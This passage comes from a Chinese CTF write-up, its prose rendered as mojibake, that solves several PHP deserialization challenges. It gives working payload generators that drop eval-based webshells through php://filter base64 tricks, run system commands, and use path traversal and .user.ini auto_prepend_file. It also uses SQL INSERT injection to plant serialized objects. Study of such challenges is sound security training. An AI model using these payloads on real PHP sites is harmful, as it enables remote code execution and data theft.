class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store,$key,$expire</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key=$key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire=$expire;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store=$store;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $option;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;serialize&#x27;</span>]=<span class="string">&#x27;base64_decode&#x27;</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>]=<span class="literal">false</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]=<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A($b,<span class="string">&#x27;eval.php&#x27;</span>,<span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave=<span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache=<span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete=base64_encode(<span class="string">&#x27;abc&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]); ?&gt;&#x27;</span>));</span><br><span class="line"><span class="comment">//å¿…é¡»æ·»åŠ ä¸‰ä¸ªå­—ç¬¦ä½¿å¾—shellä¹‹å‰çš„å­—ç¬¦ä¸²è¿›è¡Œbase64è§£ç æ—¶ä¸å½±å“åˆ°shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜è¦äº†è§£base64è§£ç ç‰¹ç‚¹ï¼Œbase64è§£ç çš„åˆæ³•å­—ç¬¦åªåŒ…æ‹¬<code>[a-zA-Z1-9]+/</code>è¿™64ä¸ªå­—ç¬¦ã€‚</p><ul><li>ç¼–ç æ—¶ï¼šæŠŠ<strong>æ˜æ–‡æ¯8ä½æŒ‰6ä½æŸ¥è¡¨è½¬ç </strong>ï¼Œä¸è¶³çš„ä½æ•°ç”¨<code>=</code>è¡¥0</li><li>è§£ç æ—¶ï¼šå¿½ç•¥<code>[&quot;,:</code>ç­‰64ä¸ªå­—ç¬¦ä¹‹å¤–çš„å­—ç¬¦ï¼Œç„¶åé€†è¿ç®—å°±è¡Œ</li></ul><p>æ‰€ä»¥è¦æ±‚ç¼–ç ä¸º4çš„å€æ•°ï¼Œç”±äºshellå‰é¢çš„å­—ç¬¦ä¸²ä¸­å­˜åœ¨çš„base64ç¼–ç æœ‰æ•ˆå­—ç¬¦åªæœ‰<code>php//000000000000exit</code>21ä¸ªå­—ç¬¦ï¼Œå› æ­¤åº”è¯¥åœ¨shellå‰è¡¥ä¸Š3ä¸ªæœ‰æ•ˆå­—ç¬¦ã€‚</p><h2 id="2020-æ–°æ˜¥çº¢åŒ…é¢˜">[2020 æ–°æ˜¥çº¢åŒ…é¢˜]</h2><p>å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œåœ¨æ–‡ä»¶åé‚£é‡Œåšäº†ä¸¤ä¸ªå¤„ç†ï¼Œä¸€æ˜¯æ–‡ä»¶ååŒ…å«éšæœºå­—ç¬¦ï¼Œç¬¬äºŒç‚¹æ˜¯é™åˆ¶äº†<code>.php</code>åç¼€ã€‚</p><h3 id="è§£æ³•1">è§£æ³•1</h3><p>ç›´æ¥å†™å‘½ä»¤ï¼Œç”Ÿæˆflagæ–‡ä»¶ã€‚</p><p>å‚è§å®‰å…¨å®¢æ–‡ç« :<a href="https://www.anquanke.com/post/id/194036">https://www.anquanke.com/post/id/194036</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$testB = <span class="keyword">new</span> B();</span><br><span class="line">$testB-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">$testA = <span class="keyword">new</span> A($testB, <span class="string">&quot;miao&quot;</span>);</span><br><span class="line">$testA-&gt;autosave = <span class="number">0</span>;</span><br><span class="line">$testA-&gt;cache = [<span class="string">&#x27;aaq&#x27;</span> =&gt; <span class="string">&#x27;`cat /flag &gt; ./flag.xml`&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($testA)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆautosaveè¦ä¸º0ï¼Œ<code>$testB-&gt;options['serialize']</code>è¦ä¸ºsystemå‡½æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯¹æœ€åçš„å†™æ–‡ä»¶æ²¡ä»€è«è¦æ±‚äº†ï¼Œä½†å¿…é¡»è¦æ‰§è¡Œåˆ°<code>$data = $this-&gt;serialize($value);</code>è¿™æ­¥ï¼Œ<code>$testA-&gt;cache</code>è¦ä¸ºsystemè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p><h3 id="è§£æ³•2">è§£æ³•2</h3><p>å¯¹äºå‰é¢çš„éšæœºå€¼ï¼Œä½¿ç”¨/â€¦/å³å¯æˆªæ–­ï¼Œæ—¶é—´æˆ³å°†ä¼šè¢«è®¤ä¸ºä¸€ä¸ªç›®å½•ï¼Œåé¢å³å¯è¿½åŠ å†™ä»»æ„æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/&quot;</span>);</span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../a.php/.&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;s&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h3 id="è§£æ³•3">è§£æ³•3</h3><p>å…ˆå¯ä»¥åˆ©ç”¨è·¨ç›®å½•ï¼Œè¿™æ ·å°±å¯ä»¥ä¸å»çˆ†ç ´æ–‡ä»¶åï¼Œå†åˆ©ç”¨.user.iniç»•è¿‡åç¼€åé™åˆ¶ã€‚</p><p>ä¸Šä¼ å›¾ç‰‡é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../../aaaaaa.jpg&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;moyu&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>å†ä¸Šä¼ .user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../../.user.ini&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&quot;\nauto_prepend_file=aaaaaa.jpg&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ">å‚è€ƒ</h3><p><a href="http://althims.com/2020/01/29/buu-new-year/">http://althims.com/2020/01/29/buu-new-year/</a></p><p><a href="https://www.moonback.xyz/2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/">moonback</a></p><h2 id="å®‰æ´µæ¯2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ">[å®‰æ´µæ¯2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h2><h3 id="è€ƒç‚¹-v7">è€ƒç‚¹</h3><ul><li>æºç æ³„éœ²</li><li>insertæ³¨å…¥</li><li>PHPååºåˆ—åŒ–</li></ul><h3 id="è§£é¢˜-v7">è§£é¢˜</h3><p>åœ¨ä¸»é¡µçš„æºç ä¸‹æ–¹æœ‰ä¸€ä¸ªå¼€å‘äººå‘˜ç•™çš„ä¿¡æ¯ï¼š<code>wowouploadimage</code>, githubæœç´¢è¿™ä¸ªåç§°ï¼Œå³å¯æ‰¾åˆ°æºç ã€‚</p><p>å¤§æ¦‚å°±ä¸‰ä¸ªåŠŸèƒ½ï¼šä¸Šä¼ ã€æŸ¥çœ‹ã€åˆ é™¤ã€‚</p><p>æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ª<code>__destruct()</code>å‡½æ•°ï¼Œä»¥åŠ<code>file_get_content</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params">$path</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="literal">False</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line">$content = file_get_contents($path);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ‰¾ååºåˆ—åŒ–è§¦å‘çš„ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line">$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">    $attr_temp = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), $row[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line">$attr = unserialize($attr_temp);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.$row[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.$row[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.$row[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬14è¡Œååºåˆ—åŒ–çš„å€¼æ˜¯ä»æ•°æ®åº“ä¸­å–å‡ºçš„ï¼Œè€Œåºåˆ—åŒ–çš„å€¼æ˜¯å›¾ç‰‡çš„é•¿å®½ï¼Œä¸å¯æ§ï¼Œå› æ­¤åªèƒ½å°è¯•SQLæ³¨å…¥å°†attrå±æ€§æ›¿æ¢æ‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$con = mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">$sql_val = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $key);</span><br><span class="line">$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $value);</span><br><span class="line">$sql_fields[] = <span class="string">&quot;`&quot;</span>.$key_temp.<span class="string">&quot;`&quot;</span>;</span><br><span class="line">$sql_val[] = <span class="string">&quot;&#x27;&quot;</span>.$value_temp.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,$sql_fields)).<span class="string">&quot;) VALUES(&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,$sql_val)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line">mysqli_query($con, $sql);</span><br><span class="line">$id = mysqli_insert_id($con);</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filenameå­—æ®µç›´æ¥å¯æ§ï¼Œå¯ä»¥åœ¨ä¸Šä¼ å›¾ç‰‡æ—¶ä¿®æ”¹filenameå®ç°æ³¨å…¥ã€‚</p><p>å…ˆç”Ÿæˆpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;helper&quot;:2:&#123;s:9:&quot; * ifview&quot;;b:1;s:9:&quot; * config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºå­˜åœ¨æ›¿æ¢ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$attr_temp = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), $row[<span class="string">&quot;attr&quot;</span>]);</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æŠŠpayloadå˜ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºä¸Šä¼ çš„æ–‡ä»¶åä¸­ä¸èƒ½æœ‰åŒå¼•å·ï¼Œæ‰€ä»¥å°†payloadè¿›è¡Œ16è¿›åˆ¶ç¼–ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span><br></pre></td></tr></table></figure><p>åŸæ¥çš„æ’å…¥è¯­å¥ä¸º</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images (<span class="string">`title`</span>,<span class="string">`filename`</span>,<span class="string">`ext`</span>,<span class="string">`path`</span>,<span class="string">`attr`</span>) <span class="keyword">VALUES</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a.jpg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;pic/a.jpg&#x27;</span>,<span class="string">&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä¼ å…¥titleçš„å€¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</span><br></pre></td></tr></table></figure><p>insertæ³¨å…¥å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images (<span class="string">`title`</span>,<span class="string">`filename`</span>,<span class="string">`ext`</span>,<span class="string">`path`</span>,<span class="string">`attr`</span>) <span class="keyword">VALUES</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span>),(<span class="string">&#x27;1.jpg&#x27;</span>,<span class="string">&#x27;a.jpg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;pic/a.jpg&#x27;</span>,<span class="string">&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šæ’å…¥äº†ä¸¤æ¡æ•°æ®ï¼Œå–å‡ºçš„æ—¶å€™å°±ä¼šååºåˆ—åŒ–ä¼ å…¥çš„æ•°æ®ã€‚è®¿é—®show.phpå¾—åˆ°flagã€‚</p><h2 id="NPUCTF2020-ReadlezPHP">[NPUCTF2020]ReadlezPHP</h2><h3 id="è€ƒç‚¹-v8">è€ƒç‚¹</h3><ul><li>PHPååºåˆ—åŒ–</li></ul><h3 id="è§£é¢˜-v8">è§£é¢˜</h3><p>æ‰“å¼€é¢˜ç›®ç›´æ¥æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ª<code>time.php?source</code>ï¼Œè®¿é—®å³å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒç®€å•çš„ååºåˆ—åŒ–é¢˜ç›®ï¼Œç”Ÿæˆpayload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> HelloPhp;</span><br><span class="line">$t-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">$t-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">$ut = serialize($t);</span><br><span class="line"><span class="keyword">echo</span> $ut;</span><br></pre></td></tr></table></figure><p>ç„¶åå…¨å±€æœç´¢flagã€‚</p><h3 id="åè®°-v2">åè®°</h3><p>ä¸€å¼€å§‹æˆ‘ä½¿ç”¨evalå’Œphpinfo()æ— æ³•æ‰§è¡Œ ï¼ŒæŠ¥é”™evalå‡½æ•°æ²¡æœ‰å®šä¹‰ï¼Œå»<a href="https://stackoverflow.com/questions/29707896/undefined-function-eval-php">StackOverflow</a>ä¸Šä¸€çœ‹ï¼Œè¯´æ˜¯evalä¸èƒ½ç”¨äºåŠ¨æ€å‡½æ•°ã€‚ç®€å•æ¥è¯´å°±æ˜¯ï¼š</p><p>evalæ˜¯å› ä¸ºæ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢«å¯å˜å‡½æ•°è°ƒç”¨ã€‚</p><blockquote><p>ä»€ä¹ˆæ˜¯å¯å˜å‡½æ•°ï¼Ÿ</p><p>å¯å˜å‡½æ•°å³å˜é‡ååŠ æ‹¬å·ï¼ŒPHPç³»ç»Ÿä¼šå°è¯•è§£ææˆå‡½æ•°ï¼Œå¦‚æœæœ‰å½“å‰å˜é‡ä¸­çš„å€¼ä¸ºå‘½åçš„å‡½æ•°ï¼Œå°±ä¼šè°ƒç”¨ã€‚å¦‚æœæ²¡æœ‰å°±æŠ¥é”™ã€‚<br>å¯å˜å‡½æ•°ä¸èƒ½ç”¨äºä¾‹å¦‚ 